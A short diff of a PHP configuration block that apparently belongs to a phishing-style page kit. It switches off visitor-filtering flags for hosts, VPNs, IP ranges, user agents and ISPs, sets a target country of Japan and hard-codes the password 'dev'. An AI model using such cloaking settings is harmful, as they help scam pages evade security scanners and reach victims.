@@ -9,11 +9,11 @@ $html = '<!DOCTYPE html><html lang="id"><head><title>Halaman default</title><lin
 
 $lcountry = "Japan";
 $lock_platform = "off";
-$block_host= "on";
-$block_vpn= "on";
-$block_iprange= "on";
-$block_ua= "on";
-$block_isp = "on";
+$block_host= "";
+$block_vpn= "";
+$block_iprange= "";
+$block_ua= "";
+$block_isp = "";
 $redir_pass = "on";
 $password = "dev";
 
